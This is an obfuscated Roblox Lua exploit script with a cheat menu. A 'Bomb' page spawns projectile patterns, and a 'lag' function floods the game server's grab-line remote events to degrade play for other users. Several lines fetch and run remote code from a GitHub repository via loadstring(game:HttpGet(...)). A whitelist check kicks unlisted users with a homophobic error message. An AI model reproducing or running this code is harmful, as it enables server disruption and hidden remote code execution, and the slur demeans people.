															v367 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\178\116\62\70\251\147", "\142\224\21\90\47")]=(110 - 60),[LUAOBFUSACTOR_DECRYPT_STR_0("\87\219\43\89\182", "\229\20\180\71\54\196\235")]=Color3.fromRGB(math.random(0 + 0, 301 - (45 + 1)), math.random(0 + 0, 2245 - (1282 + 708)), math.random(1212 - (583 + 629), 43 + 212)),[LUAOBFUSACTOR_DECRYPT_STR_0("\29\119\204\230\217\175\142\46\106\201", "\224\73\30\161\131\149\202")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\197\252\225\85", "\48\145\133\145")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\114\69\161\236\222\52", "\76\58\44\213\142\177")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\238\60\2\33\119\207\33\1\15\97\237\45\0\40", "\24\171\68\114\77")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\194\28\72\116\136\204\7\168\223\24\66\97\147\203\0\158\254\8\81\64\130\218", "\205\143\125\48\50\231\190\100")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\229\162\7\17\243\236\198\177\236\168\16\0\237", "\194\161\199\116\101\129\131\191")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\193\43\204\173\251", "\194\140\68\168\200\151")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\103\227\197\41\250\70\254\198\7\236\114\244\220\43\225\91", "\149\34\155\181\69")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\42\240\197\251\0\233\230\234\6\248\209", "\154\99\157\181")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\189\0\255\169\248\132\0\226\144\237\159\27", "\140\237\111\140\192")]=path_b['BombMissile']['Body']};
															Realse_Bomb(v367, v353);
															v366 = 1171 - (943 + 227);
														end
														if (v366 == (1 + 0)) then
															wait();
															break;
														end
													end
												end
												Destroy_Bomb();
												break;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\42\62\95\44", "\120\102\121\29")) then
										local v361 = 1631 - (1539 + 92);
										local v362;
										while true do
											if (v361 == (1948 - (706 + 1240))) then
												v362[LUAOBFUSACTOR_DECRYPT_STR_0("\143\236\181\52\190", "\91\204\131\217")] = Color3.fromRGB(504 - (81 + 177), 714 - 461, 302 - (212 + 45));
												for v376 = 0 - 0, 2046 - (708 + 1238) do
													if ((v376 % (1 + 1)) == (0 + 0)) then
														local v384 = 1667 - (586 + 1081);
														while true do
															if (v384 == (511 - (348 + 163))) then
																Realse_Bomb(v362, Vector3.new(v376, 225 + 25, 300 - (215 + 65)));
																Realse_Bomb(v362, Vector3.new(v376, 637 - 387, 1884 - (1541 + 318)));
																break;
															end
														end
													end
												end
												v362[LUAOBFUSACTOR_DECRYPT_STR_0("\237\240\89\219\161", "\158\174\159\53\180\211\189")] = Color3.fromRGB(73 + 9, 116 + 112, 50 + 16);
												v361 = 1753 - (1036 + 714);
											end
											if (v361 == (1 + 0)) then
												for v377 = 0 + 0, 1380 - (883 + 397) do
													if ((v377 % (592 - (563 + 27))) == (0 - 0)) then
														local v385 = 1986 - (1369 + 617);
														while true do
															if (v385 == (1487 - (85 + 1402))) then
																Realse_Bomb(v362, Vector3.new(v377, 87 + 163, 0 - 0));
																Realse_Bomb(v362, Vector3.new(v377, 653 - (274 + 129), 222 - (12 + 205)));
																break;
															end
														end
													end
												end
												v362[LUAOBFUSACTOR_DECRYPT_STR_0("\113\242\225\210\101", "\213\50\157\141\189\23")] = Color3.fromRGB(231 + 22, 441 - 327, 44 + 1);
												for v378 = 384 - (27 + 357), 580 - (91 + 389) do
													if ((v378 % (299 - (90 + 207))) == (0 + 0)) then
														local v386 = 861 - (706 + 155);
														while true do
															if (v386 == (1795 - (730 + 1065))) then
																Realse_Bomb(v362, Vector3.new(v378, 1813 - (1339 + 224), 6 + 4));
																Realse_Bomb(v362, Vector3.new(v378, 223 + 27, 22 - 7));
																break;
															end
														end
													end
												end
												v361 = 845 - (268 + 575);
											end
											if (v361 == (1294 - (919 + 375))) then
												SpawnBomb();
												v362 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\204\39\128\169\103\183", "\196\158\70\228\192\18")]=(13 - 8),[LUAOBFUSACTOR_DECRYPT_STR_0("\105\80\29\65\203", "\185\42\63\113\46")]=Color3.fromRGB(1226 - (180 + 791), 1965 - (323 + 1482), 2158 - (1177 + 741)),[LUAOBFUSACTOR_DECRYPT_STR_0("\224\196\49\60", "\123\180\189\65\89")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\246\133\253\225\165\199\130\247\240\129", "\233\162\236\144\132")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\154\205\234\24\182\238", "\63\210\164\158\122\217\150")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\22\211\230\224\70\252\54\216\212\245\111\241\33\206", "\152\83\171\150\140\41")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\175\228\155\21\219\9\11\135\213\134\33\231\15\29\134\214\146\38\213\9\13\134", "\104\226\133\227\83\180\123")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\39\14\48\68\17\4\58\67\46\4\39\85\15", "\48\99\107\67")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\243\169\121\213\33", "\27\190\198\29\176\77")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\202\83\237\56\166\74\234\88\223\45\153\65\230\69\233\45", "\46\143\43\157\84\201")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\126\117\70\195\92\7\251\71\125\83\198", "\168\55\24\54\162\63\115")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\39\245\51\137\198\199\24\244\16\129\192\218", "\174\119\154\64\224\178")]=path_b['BombMissile']['Body']};
												v362[LUAOBFUSACTOR_DECRYPT_STR_0("\9\113\201\116\23", "\132\74\30\165\27\101\199\122")] = Color3.fromRGB(98 + 155, 100 - 55, 4 + 41);
												v361 = 110 - (96 + 13);
											end
											if (v361 == (1925 - (962 + 959))) then
												v362[LUAOBFUSACTOR_DECRYPT_STR_0("\12\232\243\168\181", "\212\79\135\159\199\199\213")] = Color3.fromRGB(419 - 251, 12 + 54, 1579 - (461 + 890));
												for v379 = 0 + 0, 389 - 289 do
													if ((v379 % (245 - (19 + 224))) == (0 + 0)) then
														local v387 = 198 - (37 + 161);
														while true do
															if (v387 == (0 + 0)) then
																Realse_Bomb(v362, Vector3.new(v379, 97 + 153, 50 + 0));
																Realse_Bomb(v362, Vector3.new(v379, 311 - (60 + 1), 978 - (826 + 97)));
																break;
															end
														end
													end
												end
												Destroy_Bomb();
												break;
											end
											if ((3 + 0) == v361) then
												for v380 = 0 - 0, 206 - 106 do
													if ((v380 % (687 - (375 + 310))) == (1999 - (1864 + 135))) then
														local v388 = 0 - 0;
														while true do
															if (v388 == (0 + 0)) then
																Realse_Bomb(v362, Vector3.new(v380, 84 + 166, 73 - 43));
																Realse_Bomb(v362, Vector3.new(v380, 1381 - (314 + 817), 20 + 15));
																break;
															end
														end
													end
												end
												v362[LUAOBFUSACTOR_DECRYPT_STR_0("\90\175\185\72\78", "\120\25\192\213\39\60\183")] = Color3.fromRGB(280 - (32 + 182), 65 + 22, 796 - 568);
												for v381 = 65 - (39 + 26), 244 - (54 + 90) do
													if ((v381 % (200 - (45 + 153))) == (0 + 0)) then
														local v389 = 552 - (457 + 95);
														while true do
															if ((0 + 0) == v389) then
																Realse_Bomb(v362, Vector3.new(v381, 521 - 271, 96 - 56));
																Realse_Bomb(v362, Vector3.new(v381, 903 - 653, 21 + 24));
																break;
															end
														end
													end
												end
												v361 = 13 - 9;
											end
										end
									elseif (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\40\69\49\65\11", "\40\120\32\95")) then
										local v368 = 0 - 0;
										local v369;
										while true do
											if (v368 == (751 - (485 + 263))) then
												v369[LUAOBFUSACTOR_DECRYPT_STR_0("\25\164\53\117\189", "\127\90\203\89\26\207")] = Color3.fromRGB(962 - (575 + 132), 881 - (750 + 111), 1055 - (445 + 565));
												for v390 = 0 + 0, 1 + 4 do
													if ((v390 % (2 - 0)) == (0 + 0)) then
														Realse_Bomb(v369, Vector3.new(v390 + (435 - (189 + 121)), 62 + 188, 1347 - (634 + 713)));
													end
												end
												Destroy_Bomb();
												break;
											end
											if (v368 == (540 - (493 + 45))) then
												v369[LUAOBFUSACTOR_DECRYPT_STR_0("\254\58\163\196\27", "\157\189\85\207\171\105")] = Color3.fromRGB(1223 - (493 + 475), 12 + 33, 914 - (158 + 626));
												for v391 = 0 + 0, 16 - 6 do
													if ((v391 % (1 + 1)) == (0 + 0)) then
														local v396 = 1091 - (1035 + 56);
														while true do
															if (v396 == (960 - (114 + 845))) then
																Realse_Bomb(v369, Vector3.new(v391 + 47 + 73, 639 - 389, 2 + 0));
																Realse_Bomb(v369, Vector3.new(v391 + (1169 - (179 + 870)), 350 - 100, -(880 - (827 + 51))));
																break;
															end
															if ((0 - 0) == v396) then
																Realse_Bomb(v369, Vector3.new(v391 + 61 + 59, 723 - (95 + 378), 1 + 3));
																Realse_Bomb(v369, Vector3.new(v391 + (170 - 50), 220 + 30, -(1015 - (334 + 677))));
																v396 = 3 - 2;
															end
														end
													end
												end
												for v392 = 1056 - (1049 + 7), 21 - 16 do
													if ((v392 % (3 - 1)) == (0 + 0)) then
														Realse_Bomb(v369, Vector3.new(v392 + (321 - 201), 500 - 250, 0 + 0));
													end
												end
												v368 = 1423 - (1004 + 416);
											end
											if ((1957 - (1621 + 336)) == v368) then
												SpawnBomb();
												v369 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\244\160\220\188\22\213", "\99\166\193\184\213")]=(1944 - (337 + 1602)),[LUAOBFUSACTOR_DECRYPT_STR_0("\245\184\140\180\30", "\234\182\215\224\219\108")]=Color3.fromRGB(1772 - (1014 + 503), 1175 - (446 + 569), 11 + 229),[LUAOBFUSACTOR_DECRYPT_STR_0("\244\152\171\48", "\85\160\225\219")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\104\12\142\204\26\217\69\91\17\139", "\43\60\101\227\169\86\188")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\88\193\197\189\85\212", "\87\16\168\177\223\58\172\217")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\17\213\73\209\52\48\200\74\255\34\18\196\75\216", "\91\84\173\57\189")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\61\184\20\218\175\196\19\188\60\249\178\229\4\172\8\207\177\195\17\171\9\248", "\182\112\217\108\156\192")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\142\13\91\251\153\165\17\91\194\132\174\13\68", "\235\202\104\40\143")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\32\132\31\188\1", "\217\109\235\123")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\2\145\110\90\127\212\200\174\5\144\78\89\121\222\217\164", "\221\71\233\30\54\16\176\173")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\29\241\78\190\55\232\109\175\49\249\90", "\223\84\156\62")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\230\243\241\212\163\50\217\242\210\220\165\47", "\91\182\156\130\189\215")]=path_b['BombMissile']['Body']};
												Realse_Bomb(v369, Vector3.new(0 - 0, 6 + 244, 505 - (223 + 282)));
												v368 = 1 + 0;
											end
											if ((1 - 0) == v368) then
												for v393 = 0 - 0, 790 - (623 + 47) do
													if ((v393 % (47 - (32 + 13))) == (0 + 0)) then
														local v397 = 0 + 0;
														while true do
															if (v397 == (1803 - (1070 + 731))) then
																Realse_Bomb(v369, Vector3.new(v393, 239 + 11, 1404 - (1257 + 147)));
																break;
															end
															if (v397 == (1 + 0)) then
																Realse_Bomb(v369, Vector3.new(v393, 478 - 228, 135 - (98 + 35)));
																Realse_Bomb(v369, Vector3.new(v393, 105 + 145, -(6 - 4)));
																v397 = 6 - 4;
															end
															if (v397 == (0 + 0)) then
																Realse_Bomb(v369, Vector3.new(v393, 220 + 30, 2 + 2));
																Realse_Bomb(v369, Vector3.new(v393, 807 - (395 + 162), -(4 + 0)));
																v397 = 1942 - (816 + 1125);
															end
														end
													end
												end
												for v394 = 0 - 0, 1168 - (701 + 447) do
													if ((v394 % (2 - 0)) == (0 - 0)) then
														local v398 = 1341 - (391 + 950);
														while true do
															if (v398 == (0 - 0)) then
																Realse_Bomb(v369, Vector3.new(0 - 0, 616 - 366, v394 + 4 + 1));
																for v400 = 0 + 0, 73 - 53 do
																	if ((v400 % (1524 - (251 + 1271))) == (0 + 0)) then
																		Realse_Bomb(v369, Vector3.new(v400, 669 - 419, v394 + (12 - 7)));
																	end
																end
																break;
															end
														end
													end
												end
												for v395 = 0 - 0, 1279 - (1147 + 112) do
													if ((v395 % (1 + 1)) == (0 - 0)) then
														local v399 = 0 + 0;
														while true do
															if (v399 == (697 - (335 + 362))) then
																Realse_Bomb(v369, Vector3.new(0 + 0, 376 - 126, -v395 - (13 - 8)));
																for v401 = 0 - 0, 97 - 77 do
																	if ((v401 % (5 - 3)) == (566 - (237 + 329))) then
																		Realse_Bomb(v369, Vector3.new(v401, 895 - 645, -v395 - (4 + 1)));
																	end
																end
																break;
															end
														end
													end
												end
												v368 = 2 + 0;
											end
										end
									end
									loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/ch_wl_lst.lua"))();
									v175 = 1126 - (408 + 716);
								end
								if (v175 == (7 - 5)) then
									loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/pr234hWL3478.lua"))();
									loadstring(game:HttpGet("https://raw.githubusercontent.com/dg2iugesgh/rfsdv324t/main/e23v2e.lua"))();
									v175 = 824 - (344 + 477);
								end
								if ((0 + 0) == v175) then
									if not table.find(acc_y, game['Players']['LocalPlayer']['UserId'] .. game['Players']['LocalPlayer']['Character']['Name']) then
										local v258 = 1761 - (1188 + 573);
										local v259;
										local v260;
										while true do
											if (v258 == (0 - 0)) then
												v259 = LUAOBFUSACTOR_DECRYPT_STR_0("\62\90\129\21\89\82\149\20\63\50", "\53\30\19\204");
												v260 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\203\229\96\136\174\250\225\100\129\163\202\244\127\150\166\254\229", "\199\153\128\16\228"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v259, LUAOBFUSACTOR_DECRYPT_STR_0("\240\38\233", "\199\177\74\133\121"));
												v258 = 1 + 0;
											end
											if (v258 == (3 - 2)) then
												game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
												break;
											end
										end
									end
									if (location_bomb == LUAOBFUSACTOR_DECRYPT_STR_0("\136\192\178\245\119\238\37\173\218\185", "\74\216\169\220\158\87\166")) then
										path_b = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\223\44\1\39\73\248\34\16\41", "\58\136\67\115\76"))['PlotItems']['Plot2'];
									elseif (location_bomb == LUAOBFUSACTOR_DECRYPT_STR_0("\214\184\221\92\139\96\131\82\228\185\221", "\61\145\202\184\57\229\64\203")) then
										path_b = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\107\93\155\76\79\66\136\68\89", "\39\60\50\233"))['PlotItems']['Plot1'];
									elseif (location_bomb == LUAOBFUSACTOR_DECRYPT_STR_0("\45\58\183\47\138\104\154\172\15\32\166", "\195\122\83\195\76\226\72\210")) then
										path_b = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\211\219\41\245\50\244\213\56\251", "\65\132\180\91\158"))['PlotItems']['Plot3'];
									elseif (location_bomb == LUAOBFUSACTOR_DECRYPT_STR_0("\47\125\193\47\11\60\249\33\16\111\212", "\78\101\28\177")) then
										path_b = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\18\187\242\90\54\164\225\82\32", "\49\69\212\128"))['PlotItems']['Plot5'];
									elseif (location_bomb == LUAOBFUSACTOR_DECRYPT_STR_0("\53\0\197\247\161\63\3\197\225\228", "\129\119\108\176\146")) then
										path_b = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\11\192\21\198\54\30\29\63\202", "\124\92\175\103\173\69\110"))['PlotItems']['Plot4'];
									else
										path_b = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\246\55\17\60\210\40\2\52\196", "\87\161\88\99"))[game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\33\233\238\219\185\213\39\59\247\219\195\174\195", "\67\114\153\143\172\215\176")];
									end
									v175 = 1 - 0;
								end
							end
						end
						Bomb = v5.AddPage(LUAOBFUSACTOR_DECRYPT_STR_0("\156\173\227\12", "\110\222\194\142"));
						v46 = 12 - 7;
					end
					if (v46 == (1535 - (508 + 1021))) then
						v50 = Bomb.AddColourPicker(LUAOBFUSACTOR_DECRYPT_STR_0("\52\214\23\166\64", "\193\119\185\123\201\50"), LUAOBFUSACTOR_DECRYPT_STR_0("\96\0\240\50\10", "\127\23\104\153\70\111\25"), function(v176)
							Color = v176;
						end);
						Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\37\8\165\174\63\37\184\189", "\211\105\103\198\207\75\76\215"), {LUAOBFUSACTOR_DECRYPT_STR_0("\225\178\164\252\119\8\191", "\214\174\199\208\143\30\108\218"),LUAOBFUSACTOR_DECRYPT_STR_0("\33\141\5\161\229\126\215\92\2\129", "\41\113\228\107\202\197\54\184"),LUAOBFUSACTOR_DECRYPT_STR_0("\77\132\44\95\114\205\16\83\111\158\61", "\60\26\237\88"),LUAOBFUSACTOR_DECRYPT_STR_0("\250\38\97\227\238\240\37\97\245\171", "\206\184\74\20\134"),LUAOBFUSACTOR_DECRYPT_STR_0("\31\246\235\180\253\10\16\195\45\247\235", "\172\88\132\142\209\147\42\88"),LUAOBFUSACTOR_DECRYPT_STR_0("\173\139\220\12\56\181\150\136\159\223\8", "\222\231\234\172\109\86\149")}, function(v177)
							location_bomb = v177;
						end);
						v51 = Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\221\238\210\12\228\236\204\29\254", "\120\141\143\160"), {LUAOBFUSACTOR_DECRYPT_STR_0("\114\163\181\89\69\184", "\50\32\204\214"),LUAOBFUSACTOR_DECRYPT_STR_0("\164\70\57\117\160", "\113\230\39\85\25\211"),LUAOBFUSACTOR_DECRYPT_STR_0("\235\181\21\252\38\201\167\78\158\136\19\234\52\223\170\69\221\190", "\43\190\219\102\136\71\171\203"),LUAOBFUSACTOR_DECRYPT_STR_0("\4\119\34\92\53\113\34\82", "\57\66\30\80"),LUAOBFUSACTOR_DECRYPT_STR_0("\11\217\172\25\139\54\250", "\228\73\184\192\117\228\89\148")}, function(v178)
							if (v178 == LUAOBFUSACTOR_DECRYPT_STR_0("\253\134\118\31\202\157", "\116\175\233\21")) then
								TypeBoom = LUAOBFUSACTOR_DECRYPT_STR_0("\220\247\179\68\246\56\44\237\241\178\67", "\95\158\152\222\38\187\81");
							elseif (v178 == LUAOBFUSACTOR_DECRYPT_STR_0("\205\179\38\166\162\202\244\184\117\129\182\202\235\169\52\188\160\205", "\168\152\221\85\210\195")) then
								TypeBoom = LUAOBFUSACTOR_DECRYPT_STR_0("\130\211\229\139\164\218\240", "\231\203\190\149");
							elseif (v178 == LUAOBFUSACTOR_DECRYPT_STR_0("\235\52\241\244\171\250\9\198", "\123\173\93\131\145\220\149")) then
								TypeBoom = LUAOBFUSACTOR_DECRYPT_STR_0("\48\205\255\36\99\246\4\207", "\153\118\164\141\65\20");
							elseif (v178 == LUAOBFUSACTOR_DECRYPT_STR_0("\204\51\138\238\248\15\224", "\96\142\82\230\130\151")) then
								TypeBoom = LUAOBFUSACTOR_DECRYPT_STR_0("\109\177\67\78\235\225\65\128\64\82", "\142\47\208\47\34\132");
							elseif (v178 == LUAOBFUSACTOR_DECRYPT_STR_0("\212\191\8\14\72", "\60\150\222\100\98\59")) then
								TypeBoom = LUAOBFUSACTOR_DECRYPT_STR_0("\118\50\88\65\235\181\62\67", "\81\37\92\55\54\187\218");
							end
						end);
						v46 = 10 - 3;
					end
				end
			end
			function lag()
				local v53 = 978 - (194 + 784);
				local v54;
				local v55;
				local v56;
				local v57;
				local v58;
				local v59;
				local v60;
				local v61;
				local v62;
				while true do
					if (v53 == (1775 - (694 + 1076))) then
						v54.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\51\80\172\35\146\59\116\164\57\134\64\88\237\3\136\13\65\191\119\157\64\116\172\52\138\5\80\190\10", "\225\96\36\205\87"));
						v62 = v54.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\218\146\99\77\79", "\105\137\198\34\25\28\47"));
						break;
					end
					if (v53 == (1904 - (122 + 1782))) then
						DEBAG = false;
						STP = false;
						READY = true;
						DEF = {[LUAOBFUSACTOR_DECRYPT_STR_0("\33\128\111\81", "\160\113\201\33\22")]=(706 + 44),[LUAOBFUSACTOR_DECRYPT_STR_0("\224\113\129\130", "\205\180\56\204\199\201")]=(14 + 1),[LUAOBFUSACTOR_DECRYPT_STR_0("\179\255\31\51", "\120\227\190\92")]=(1621 + 179),[LUAOBFUSACTOR_DECRYPT_STR_0("\10\125\54\79", "\130\93\60\127\27\67\60\185")]=(2 + 0)};
						v53 = 2 - 1;
					end
					if (v53 == (2 + 0)) then
						PACK = DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\120\19\27\101", "\29\40\82\88\46\128\35")];
						WAIT = DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\12\100\253\41", "\216\91\37\180\125\97")];
						function SEND(v179)
							local v180 = 1970 - (214 + 1756);
							while true do
								if (v180 == (4 - 3)) then
									TIMER = 0 + 0;
									READY = true;
									break;
								end
								if ((0 + 0) == v180) then
									if READY then
										local v262 = 585 - (217 + 368);
										local v263;
										local v264;
										while true do
											if ((0 - 0) == v262) then
												if not table.find(acc_y, game['Players']['LocalPlayer']['UserId'] .. game['Players']['LocalPlayer']['Character']['Name']) then
													local v288 = 0 + 0;
													local v289;
													local v290;
													while true do
														if (v288 == (0 + 0)) then
															v289 = LUAOBFUSACTOR_DECRYPT_STR_0("\101\95\49\131\112\4\79\93\130\22", "\55\69\22\124\163");
															v290 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\74\214\76\228\214\114\81\224\125\215\111\252\208\99\81\243\125", "\148\24\179\60\136\191\17\48"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v289, LUAOBFUSACTOR_DECRYPT_STR_0("\147\38\245", "\150\210\74\153\192"));
															v288 = 1 + 0;
														end
														if ((890 - (844 + 45)) == v288) then
															game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
															break;
														end
													end
												end
												READY = false;
												v262 = 285 - (242 + 42);
											end
											if (v262 == (3 - 1)) then
												if (v179 == (0 - 0)) then
													local v291 = 1200 - (132 + 1068);
													while true do
														if (v291 == (0 - 0)) then
															WAIT = DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\212\233\17\190", "\212\131\168\88\234\21\26")];
															PACK = DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\117\85\170\167", "\71\37\20\233\236\88")];
															break;
														end
													end
												end
												for v283 = 1623 - (214 + 1409), math.floor(TIME / WAIT) do
													local v284 = 0 + 0;
													local v285;
													local v286;
													while true do
														if (v284 == (1637 - (497 + 1137))) then
															if STP then
																local v317 = 940 - (9 + 931);
																while true do
																	if (v317 == (291 - (181 + 108))) then
																		return;
																	end
																	if (v317 == (1 + 0)) then
																		PACKS = 0 - 0;
																		TIMER = 0 - 0;
																		v317 = 1 + 1;
																	end
																	if (v317 == (0 + 0)) then
																		READY = true;
																		STP = false;
																		v317 = 477 - (296 + 180);
																	end
																end
															elseif ((v179 == (1403 - (1183 + 220))) or (v179 == (1266 - (1037 + 228)))) then
																local v329 = 0 - 0;
																while true do
																	if ((0 - 0) == v329) then
																		for v355 = 0 - 0, PACKS do
																			local v356 = 734 - (527 + 207);
																			while true do
																				if (v356 == (528 - (187 + 340))) then
																					game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\255\67\160\26\73\239\77\72\200\66\131\2\79\254\77\91\200", "\60\173\38\208\118\32\140\44"))['GrabEvents']['CreateGrabLine']:FireServer(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\118\61\243\216\51\223\64\49\228", "\175\33\82\129\179\64"))['Map']['BaseGround'].Grass, RANDOM);
																					break;
																				end
																				if (v356 == (1870 - (1298 + 572))) then
																					mass = {math.random(-(1170 - (144 + 26)), 2491 - 1491),math.random(-(358 + 642), 2725 - 1725),math.random(-(4847 - 3847), 508 + 492)};
																					RANDOM = CFrame.new(mass[1 - 0], mass[2 + 0], mass[2 + 1]);
																					v356 = 203 - (5 + 197);
																				end
																			end
																		end
																		wait(WAIT);
																		break;
																	end
																end
															elseif (v179 == (688 - (339 + 347))) then
																local v344 = 0 - 0;
																while true do
																	if (v344 == (0 - 0)) then
																		for v363 = 376 - (365 + 11), PACK do
																			local v364 = 0 + 0;
																			while true do
																				if (v364 == (0 - 0)) then
																					mass = {math.random(-(1924 - (837 + 87)), 1695 - 695),math.random(-(214 + 786), 2387 - (356 + 1031)),math.random(-(2646 - (73 + 1573)), 2388 - (1307 + 81))};
																					RANDOM = CFrame.new(mass[235 - (7 + 227)], mass[2 - 0], mass[169 - (90 + 76)]);
																					v364 = 3 - 2;
																				end
																				if ((1 + 0) == v364) then
																					game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\220\234\32\195\53\177\239\251\53\203\15\166\225\253\49\200\57", "\210\142\143\80\175\92"))['GrabEvents']['CreateGrabLine']:FireServer(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\142\230\225\205\170\249\242\197\188", "\166\217\137\147"))['Map']['BaseGround'].Grass, RANDOM);
																					break;
																				end
																			end
																		end
																		wait(WAIT);
																		break;
																	end
																end
															else
																wait(WAIT);
															end
															break;
														end
														if (v284 == (2 + 0)) then
															if ((PACKS > PACK) and (v179 == (1 + 0))) then
																PACKS = PACK;
															end
															if DEBAG then
																local v318 = 0 - 0;
																while true do
																	if ((260 - (197 + 63)) == v318) then
																		print("");
																		print(LUAOBFUSACTOR_DECRYPT_STR_0("\192\140\71\136\197\28\163\227", "\38\131\195\18\198\145"), v283);
																		v318 = 1 + 0;
																	end
																	if (v318 == (1 + 2)) then
																		print("");
																		print(LUAOBFUSACTOR_DECRYPT_STR_0("\30\155\119\166\117\25\30\155\119\166\117\25\30\155\119\166", "\52\51\182\90\139\88"));
																		break;
																	end
																	if (v318 == (2 + 0)) then
																		print(LUAOBFUSACTOR_DECRYPT_STR_0("\198\152\243\204\112\172\249\144", "\35\150\217\176\135"), PACKS);
																		print(LUAOBFUSACTOR_DECRYPT_STR_0("\202\117\37\56\45\3\54", "\22\153\48\107\108\23\35"), math.floor(v286 - v264));
																		v318 = 1 + 2;
																	end
																	if (v318 == (1 - 0)) then
																		print(LUAOBFUSACTOR_DECRYPT_STR_0("\62\172\149\61\37\53\1", "\137\110\229\219\122\31\21\33"), math.floor(v285));
																		print(LUAOBFUSACTOR_DECRYPT_STR_0("\59\143\31\33\118\11", "\30\122\221\88\27\86\43\68"), math.floor(v285 / v263));
																		v318 = 1371 - (618 + 751);
																	end
																end
															end
															v284 = 3 + 0;
														end
														if (v284 == (1910 - (206 + 1704))) then
															TIMER = math.floor(TIME - (v283 * WAIT));
															v285 = math.floor(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\11\60\234\146\43", "\230\88\72\139"))['Network']['ServerStatsItem'][LUAOBFUSACTOR_DECRYPT_STR_0("\86\181\2\26\67\56\81\124\179", "\56\18\212\118\123\99\104")]:GetValue());
															v284 = 1 - 0;
														end
														if (v284 == (1 - 0)) then
															v286 = math.floor(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\45\253\249\199\204", "\190\126\137\152\179\191"))['Network']['ServerStatsItem'][LUAOBFUSACTOR_DECRYPT_STR_0("\27\7\124\207\234\75\10\18\97", "\32\72\98\18\171\202")]:GetValue());
															PACKS = math.floor(PACK / (v285 / v263));
															v284 = 1 + 1;
														end
													end
												end
												break;
											end
											if (v262 == (1276 - (155 + 1120))) then
												v263 = math.floor(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\55\156\51\96\228", "\151\100\232\82\20"))['Network']['ServerStatsItem'][LUAOBFUSACTOR_DECRYPT_STR_0("\91\216\226\9\63\233\255\6\120", "\104\31\185\150")]:GetValue()) + (1581 - (396 + 1110));
												v264 = math.floor(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\239\173\242\227\244", "\160\188\217\147\151\135\172\128"))['Network']['ServerStatsItem'][LUAOBFUSACTOR_DECRYPT_STR_0("\60\216\30\244\122\194\45\205\3", "\169\111\189\112\144\90")]:GetValue());
												v262 = 4 - 2;
											end
										end
									else
										return;
									end
									PACKS = 0 + 0;
									v180 = 1 + 0;
								end
							end
						end
						v54 = v5.AddPage(LUAOBFUSACTOR_DECRYPT_STR_0("\225\130\34", "\226\173\227\69\205\223\224\105"));
						v53 = 3 + 0;
					end
					if (v53 == (977 - (230 + 746))) then
						PACKS = 601 - (473 + 128);
						TIMER = 48 - (39 + 9);
						PING = DEF[LUAOBFUSACTOR_DECRYPT_STR_0("\104\23\12\124", "\123\56\94\66\59\175")];
